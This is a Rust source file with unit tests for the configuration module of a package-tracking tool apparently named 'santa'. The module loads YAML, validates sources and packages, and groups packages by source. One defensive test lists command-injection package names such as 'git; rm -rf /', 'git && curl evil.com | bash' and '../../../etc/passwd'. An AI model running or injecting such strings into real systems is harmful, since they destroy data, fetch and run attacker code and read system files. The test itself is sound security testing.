use crate::data::SourceList;
use crate::sources::PackageSource;
use crate::Exportable;
use anyhow::Context;
use std::{
    collections::{HashMap, HashSet},
    fs,
    path::Path,
};

use tracing::{debug, trace, warn};
// use memoize::memoize;
use serde::{Deserialize, Serialize};

use crate::data::{constants, KnownSources, SantaData};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SantaConfig {
    pub sources: Vec<KnownSources>,
    pub packages: Vec<String>,
    pub custom_sources: Option<SourceList>,

    #[serde(skip)]
    _groups: Option<HashMap<KnownSources, Vec<String>>>,
    #[serde(skip)]
    pub log_level: u8,
}

impl Default for SantaConfig {
    fn default() -> Self {
        SantaConfig::load_from_str(constants::DEFAULT_CONFIG)
            .expect("Failed to load default config - this should never fail")
    }
}

impl Exportable for SantaConfig {}

impl SantaConfig {
    /// Basic configuration validation
    pub fn validate_basic(&self) -> Result<(), anyhow::Error> {
        if self.sources.is_empty() {
            return Err(anyhow::anyhow!("At least one source must be configured"));
        }

        if self.packages.is_empty() {
            warn!("No packages configured - santa will not track any packages");
        }

        // Check for duplicate sources
        let mut seen_sources = HashSet::new();
        for source in &self.sources {
            if !seen_sources.insert(source) {
                return Err(anyhow::anyhow!("Duplicate source found: {:?}", source));
            }
        }

        // Check for duplicate packages
        let mut seen_packages = HashSet::new();
        for package in &self.packages {
            if !seen_packages.insert(package) {
                warn!("Duplicate package found: {}", package);
            }
        }

        Ok(())
    }

    /// Custom validation for source/package combinations
    pub fn validate_source_package_compatibility(
        &self,
        data: &SantaData,
    ) -> Result<(), anyhow::Error> {
        for package in &self.packages {
            let available_sources = data.packages.get(package);
            if available_sources.is_none() {
                warn!(
                    "Package '{}' not found in available packages database",
                    package
                );
                continue;
            }

            let available_sources = available_sources.unwrap();
            let mut has_valid_source = false;

            for configured_source in &self.sources {
                if available_sources.contains_key(configured_source) {
                    has_valid_source = true;
                    break;
                }
            }

            if !has_valid_source {
                return Err(anyhow::anyhow!(
                    "Package '{}' is not available from any configured source. Available sources: {:?}",
                    package,
                    available_sources.keys().collect::<Vec<_>>()
                ));
            }
        }
        Ok(())
    }

    pub fn load_from_str(yaml_str: &str) -> Result<Self, anyhow::Error> {
        let data: SantaConfig = serde_yaml::from_str(yaml_str)
            .with_context(|| format!("Failed to parse config from YAML: {}", yaml_str))?;

        // Validate the configuration
        data.validate_basic()
            .with_context(|| "Configuration validation failed")?;

        Ok(data)
    }

    /// Comprehensive validation including custom business logic
    pub fn validate_with_data(&self, data: &SantaData) -> Result<(), anyhow::Error> {
        // First run basic validation
        self.validate_basic()
            .with_context(|| "Basic configuration validation failed")?;

        // Then run custom validation
        self.validate_source_package_compatibility(data)
            .with_context(|| "Source/package compatibility validation failed")?;

        Ok(())
    }

    pub fn load_from(file: &Path) -> Result<Self, anyhow::Error> {
        debug!("Loading config from: {}", file.display());
        if file.exists() {
            let yaml_str = fs::read_to_string(file)
                .with_context(|| format!("Failed to read config file: {}", file.display()))?;
            SantaConfig::load_from_str(&yaml_str)
        } else {
            warn!("Can't find config file: {}", file.display());
            warn!("Loading default config");
            Ok(SantaConfig::default())
        }
    }

    pub fn source_is_enabled(&self, source: &PackageSource) -> bool {
        trace!("Checking if {} is enabled", source);
        return self.sources.contains(&source.name);
    }

    /// Groups the configured (enabled) packages by source.
    pub fn groups(&mut self, data: &SantaData) -> HashMap<KnownSources, Vec<String>> {
        match &self._groups {
            Some(groups) => groups.clone(),
            None => {
                let configured_sources: Vec<KnownSources> = self.sources.clone();
                // let s2 = self.sources.clone();
                let mut groups: HashMap<KnownSources, Vec<String>> = HashMap::new();
                for source in configured_sources.clone() {
                    groups.insert(source, Vec::new());
                }

                for pkg in &self.packages {
                    for source in configured_sources.clone() {
                        if data.packages.contains_key(pkg) {
                            let available_sources = data
                                .packages
                                .get(pkg)
                                .expect("Package should exist in data");
                            trace!("available_sources: {:?}", available_sources);

                            if available_sources.contains_key(&source) {
                                trace!("Adding {} to {} list.", pkg, source);
                                match groups.get_mut(&source) {
                                    Some(v) => {
                                        // trace!("Adding {} to {} list.", pkg, source);
                                        v.push(pkg.to_string());
                                        break;
                                    }
                                    None => {
                                        warn!(
                                            "Group for source {} not found, creating new group",
                                            source
                                        );
                                        groups.insert(source, vec![pkg.to_string()]);
                                    }
                                }
                            }
                        }
                    }
                }
                self._groups = Some(groups);
                self._groups.clone().expect("Groups should be populated")
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::data::KnownSources;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_validate_basic_empty_sources() {
        let config = SantaConfig {
            sources: vec![],
            packages: vec!["git".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let result = config.validate_basic();
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("At least one source must be configured"));
    }

    #[test]
    fn test_validate_basic_duplicate_sources() {
        let config = SantaConfig {
            sources: vec![KnownSources::Brew, KnownSources::Brew],
            packages: vec!["git".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let result = config.validate_basic();
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Duplicate source found"));
    }

    #[test]
    fn test_validate_basic_valid_config() {
        let config = SantaConfig {
            sources: vec![KnownSources::Brew, KnownSources::Cargo],
            packages: vec!["git".to_string(), "rust".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let result = config.validate_basic();
        assert!(result.is_ok());
    }

    #[test]
    fn test_load_from_str_valid_yaml() {
        let yaml = r#"
            sources: ["brew", "cargo"]
            packages: ["git", "rust"]
        "#;

        let result = SantaConfig::load_from_str(yaml);
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 2);
        assert_eq!(config.packages.len(), 2);
        assert!(config.sources.contains(&KnownSources::Brew));
        assert!(config.sources.contains(&KnownSources::Cargo));
    }

    #[test]
    fn test_load_from_str_invalid_yaml() {
        let yaml = "invalid: yaml: content: ["; // Malformed YAML

        let result = SantaConfig::load_from_str(yaml);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Failed to parse config from YAML"));
    }

    #[test]
    fn test_load_from_str_validation_failure() {
        let yaml = r#"
            sources: []
            packages: ["git"]
        "#;

        let result = SantaConfig::load_from_str(yaml);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Configuration validation failed"));
    }

    #[test]
    fn test_load_from_file_existing() {
        let yaml_content = r#"
            sources: ["brew"]
            packages: ["git"]
        "#;

        let mut temp_file = NamedTempFile::new().unwrap();
        write!(temp_file, "{}", yaml_content).unwrap();

        let result = SantaConfig::load_from(temp_file.path());
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 1);
        assert_eq!(config.packages.len(), 1);
    }

    #[test]
    fn test_load_from_file_nonexistent() {
        let nonexistent_path = Path::new("/nonexistent/config.yaml");

        let result = SantaConfig::load_from(nonexistent_path);
        assert!(result.is_ok()); // Should return default config

        let config = result.unwrap();
        // Default config should have some sources
        assert!(!config.sources.is_empty());
    }

    #[test]
    fn test_potential_injection_in_package_names() {
        // Test that potentially dangerous package names are handled safely
        let dangerous_names = vec![
            "git; rm -rf /".to_string(),
            "$(rm -rf /)".to_string(),
            "`rm -rf /`".to_string(),
            "git && curl evil.com | bash".to_string(),
            "../../../etc/passwd".to_string(),
        ];

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: dangerous_names.clone(),
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        // Config should load but we need to ensure these names are sanitized later
        let result = config.validate_basic();
        assert!(
            result.is_ok(),
            "Basic validation should pass even with suspicious package names"
        );

        // Verify the dangerous names are preserved (they should be sanitized at execution time)
        assert_eq!(config.packages, dangerous_names);
    }

    #[test]
    fn test_unknown_source_handling() {
        let yaml = r#"
            sources: ["brew", "unknown_source", "cargo"]
            packages: ["git"]
        "#;

        let result = SantaConfig::load_from_str(yaml);
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 3);

        // Check that unknown source is handled properly
        let has_unknown = config
            .sources
            .iter()
            .any(|s| matches!(s, KnownSources::Unknown(_)));
        assert!(
            has_unknown,
            "Unknown source should be preserved as Unknown variant"
        );
    }
}
